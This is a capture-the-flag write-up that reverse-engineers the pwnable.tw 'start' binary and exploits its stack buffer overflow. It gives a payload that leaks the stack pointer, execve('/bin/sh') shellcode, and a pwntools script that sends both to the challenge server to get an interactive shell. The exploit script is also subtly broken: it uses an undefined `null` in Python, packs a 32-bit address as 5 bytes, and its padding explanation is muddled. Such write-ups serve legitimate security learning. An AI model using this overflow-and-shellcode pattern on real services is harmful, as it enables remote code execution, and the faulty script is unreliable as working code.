# Getting started

My task was to beat the first pwnable challenge, named `start`

Initial information is provided in its page https://pwnable.tw/challenge/#1

There we see, that `start` process is listening to incoming tcp connections.

There is also a download link for `start` executable.

# Blind research.

Let's try to connect to the provided domain:port
`chall.pwnable.tw:10000`

```shell
$ nc chall.pwnable.tw 10000
Let's start the CTF:
```

Input prompt is printed and `start` seems to wait for user input. If you try to write something, connection is immediately closed.

# Research with one eye open.

Let's actually download `start` and investigate its contents more closely.

## Determinate size.

```shell
$ du -h
4.0K	start
```

4.0K size is not much, my guess that is `start` is written in pure assembly language or C.

## Determinate file type

```shell
$ file start
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

Interesting. `start` is 4 kilobytes sized ELF 32-bit executable.

## Symbols

Let's examine symbols that `start` contains.

```shell
$ nm start
080490a3 T __bss_start
080490a3 T _edata
080490a4 T _end
0804809d t _exit
08048060 T _start
```

Pretty empty, just standard stuff. Entry point is `0x8048060`.

## `checksec` script.

```shell
$ checksec start
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

Binary isn't protected by NX bit or stack canaries. Will be interesting to see if there are buffer overflow vulnerabilities.

# Research with all eyes open.

Let's disassemble `start` code (for simplicity machine instructions hex code was omitted)

```assembly
$ objdump -D -M intel start

start:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:	push   esp
 8048061:	push   0x804809d
 8048066:	xor    eax,eax
 8048068:	xor    ebx,ebx
 804806a:	xor    ecx,ecx
 804806c:	xor    edx,edx
 804806e:	push   0x3a465443
 8048073:	push   0x20656874
 8048078:	push   0x20747261
 804807d:	push   0x74732073
 8048082:	push   0x2774654c
 8048087:	mov    ecx,esp
 8048089:	mov    dl,0x14
 804808b:	mov    bl,0x1
 804808d:	mov    al,0x4
 804808f:	int    0x80
 8048091:	xor    ebx,ebx
 8048093:	mov    dl,0x3c
 8048095:	mov    al,0x3
 8048097:	int    0x80
 8048099:	add    esp,0x14
 804809c:	ret

0804809d <_exit>:
 804809d:	pop    esp
 804809e:	xor    eax,eax
 80480a0:	inc    eax
 80480a1:	int    0x80
```

Let's reverse engineer this code part by part. Reader should be aware, that Linux syscalls are implemented, using `int 0x80` instruction. Arguments are passed in registers.

### Prologue

Prologue part of the entry point is very simple.

```assembly
8048060:	push   esp # Save current stack pointer
8048061:	push   0x804809d # Push address of _exit
8048066:	xor    eax,eax # Zero out bunch of registers
8048068:	xor    ebx,ebx
804806a:	xor    ecx,ecx
804806c:	xor    edx,edx
```

Interesting part is that current address of stack pointer is saved. It's pretty unusual.

### Writing to stdout.

```assembly
 804806e:	push   0x3a465443 # 'Let's start the CTF' text is pushed to the stack.
 8048073:	push   0x20656874
 8048078:	push   0x20747261
 804807d:	push   0x74732073
 8048082:	push   0x2774654c
 8048087:	mov    ecx,esp # Second argument is the start of pushed text.
 8048089:	mov    dl,0x14 # Third argument is 20, indicating length of text
 804808b:	mov    bl,0x1 # First argument is 0x1 stdout file descriptor
 804808d:	mov    al,0x4 # 0x4 indicates SYS_write(int fd, const void *buf, size_t count) syscall
 804808f:	int    0x80 # Initiate syscall
```

`SYS_write` writes buffer to the specified file descriptor. Fortunately this part of code is correct, there are no buffer overflow vulnerabilities. 20 characters pushed, 20 characters printed.

### Reading from stdin.

```assembly
 8048091:	xor    ebx,ebx # First argument 0x0 indicates reading from stdin
 8048093:	mov    dl,0x3c # This argument indicates size of the buffer
 8048095:	mov    al,0x3 # 0x3 indicates SYS_read(int fd, void *buf, size_t count)
 8048097:	int    0x80
```

Reading from stdin is after writing to stdout. It reuses second argument of the reading part. That is buffer of 20 bytes length. Containing `Let's start the CTF`. Count argument is totally wrong, `0x3c` is 60 bytes, but buffer size is only 20. There is _buffer overflow vulnerability_.

Let's examine function prologue.

### Prologue

```
 8048099:	add    esp,0x14 # Free allocated memory for text
 804809c:	ret # Jump to _exit subroutine (see address 0x8048060)
```

Prologue is pretty straightforward. It deallocates memory from stack and tries to gracefully shutdown program.

# First payload

`start` is vulnerable to remote code execution via buffer overflow vulnerability. To actually start exploiting this vulnerability, we need to get `ESP` register content. In x86 Linux there is no guarantee that stack pointer address will remain the same.

Fortunately for us, current stack pointer is saved at the entry point.

```
8048060:	push   esp # Save current stack pointer
```

We just need to carefully overwrite return address in the stack, so at the end of `_start`, ret instruction will jump to code that will print `ESP` for us.

Printing routine starts at `0x8048087`.

```assembly
8048087:	mov    ecx,esp
```

Conveniently current stack pointer address is used as buffer (`ecx` is second argument of syscall). We can print first 20 bytes of stack buffer. I should remind you that stack pointer address is in the stack.

Very conveniently printing to the `stdout` is before reading from `stdin`. That means we can easily send second payload and exploit `ret` second time.

`get_esp.asm` payload source code is as simple as it description.

```
.long 0,0,0,0,0 # Overwrite first 20 bytes of buffer
.long 0x08048087 # SYS_write address
```

Let's compile it with `shellnoob`.

`shellnoob --intel --from-asm get_esp.asm --to-bin`

And try to get current stack pointer address.

```
$ ./start < get_esp2.bin > output.raw
[1]    591345 segmentation fault (core dumped)  ./start < get_esp2.bin > output.raw
```

It's pretty natural that program will now abnormally terminate, because second time return address will be incorrect.

```
$ du --bytes output.raw
40	output.raw
```

Success! 20 bytes of text and 20 bytes of stack.

```
$ cat output.raw
Let's start the CTF:�Z���s���s��%
```

# Shellcode.

```assembly
mov eax, 0
push eax # Push /bin/sh\0 part by part
push 0x68732f2f
push 0x6e69622f
mov ebx, esp # First argument set to /bin/sh\0
mov ecx, eax # Second argument is 0
mov edx, eax # Third argument is 0
mov al, 0xb # SYS_execve(const char *pathname, char *const argv[], char *const envp[])
int 0x80
xor eax, eax
inc eax # SYS_exit() syscall gracefully shutdowns program
int 0x80
```

Shellcode is pretty straightforward it launches `/bin/sh` child process using `execve`, so you can use this program like interactive shell.

# Proof of concept.

Proot of concept works in 3 steps.

1. Send payload to get ESP register.
2. Wait while program asks for input again.
3. Send `0x14` bytes padding + ESP register + shellcode.

Padding is required, because 14 bytes of stack are cleared. ESP register content on top of stack will force program to start executing code on the stack, after `ret` instruction.

```python

#!/bin/python
from pwn import *
from binascii import hexlify


def main():
    payload_get_esp = null
    shellcode = null

    with log.progress("Loading payloads...") as p:
        payload_get_esp = open("get_esp.bin", "rb").read()
        shellcode = open("shellcode.bin", "rb").read()
        p.success()

    #conn = remote('127.0.0.1', 2323)
    conn = remote("chall.pwnable.tw", 10000)

    context.terminal = ["gnome-terminal", "-e"]
    #gdb.attach("start")

    with log.progress("Receiving initial input") as p:
        p.success("`%s`" % conn.recv(0x15).decode())

    esp = null
    with log.progress("Sending payload to get  ESP register") as p:
        conn.send(prepare(payload_get_esp))
        esp = int.from_bytes(conn.recv(0x100)[:5], byteorder="little")
        p.success('Done ESP=%s' % hex(esp))

    with log.progress("Sending shellcode") as p:
        conn.send(prepare(int.to_bytes(
            esp + 0x14 - 1, byteorder="little", length=5) + shellcode))
        p.success("Obtained interactive shell")
        conn.interactive()


def prepare(payload):
    return b'\0' * 0x14 + payload


main()

```
